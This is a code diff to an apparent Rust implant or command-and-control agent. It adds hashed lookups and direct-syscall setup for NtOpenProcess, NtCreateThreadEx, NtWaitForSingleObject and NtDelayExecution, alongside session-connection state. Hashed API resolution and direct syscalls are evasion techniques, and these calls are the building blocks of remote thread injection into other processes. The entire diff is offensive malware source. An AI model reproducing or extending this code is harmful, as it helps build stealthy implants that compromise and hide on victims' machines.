@@ -178,7 +178,12 @@ unsafe fn init_global_instance() {
         const NT_ENUMERATE_KEY: usize = 0x4d8a8976;
         const NT_QUERY_INFORMATION_PROCESS: usize = 0x8cdc5dc2;
         const NT_QUERY_INFORMATION_TOKEN: usize = 0xf371fe4;
-        const NT_OPEN_PROCESS_TOKEN: usize = 0x350dca99;
+        const NT_OPEN_PROCESS_TOKEN_TOKEN: usize = 0x350dca99;
+        const NT_DELAY_EXECUTION_TOKEN: usize = 0xf5a936aa;
+
+        const NT_CREATE_THREAD_EX_TOKEN: usize = 0xaf18cfb0;
+        const NT_WAIT_FOR_SINGLE_OBJECT_TOKEN: usize = 0xe8ac0c3c;
+        pub const NT_OPEN_PROCESS_TOKEN: usize = 0x4b82f718;
 
         let mut instance = Instance::new();
 
@@ -246,9 +251,15 @@ unsafe fn init_global_instance() {
         instance.ntdll.nt_query_information_process.syscall.number =
             get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);
 
+        // NtOpenProcess
+        instance.ntdll.nt_open_process.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
+        instance.ntdll.nt_open_process.syscall.number =
+            get_syscall_number(instance.ntdll.nt_open_process.syscall.address);
+
         // NtOpenProcessToken
         instance.ntdll.nt_open_process_token.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN);
+            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN_TOKEN);
         instance.ntdll.nt_open_process_token.syscall.number =
             get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);
 
@@ -257,6 +268,24 @@ unsafe fn init_global_instance() {
             ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN);
         instance.ntdll.nt_query_information_token.syscall.number =
             get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);
+
+        // NtDelayExecution
+        instance.ntdll.nt_delay_execution.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_DELAY_EXECUTION_TOKEN);
+        instance.ntdll.nt_delay_execution.syscall.number =
+            get_syscall_number(instance.ntdll.nt_delay_execution.syscall.address);
+
+        // NtCreateThreadEx
+        instance.ntdll.nt_create_thread_ex.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_THREAD_EX_TOKEN);
+        instance.ntdll.nt_create_thread_ex.syscall.number =
+            get_syscall_number(instance.ntdll.nt_create_thread_ex.syscall.address);
+
+        // NtWaitForSingleObject
+        instance.ntdll.nt_wait_for_single_object.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_TOKEN);
+        instance.ntdll.nt_wait_for_single_object.syscall.number =
+            get_syscall_number(instance.ntdll.nt_wait_for_single_object.syscall.address);
 
         // Init Session Data
         instance.session.connected = false;
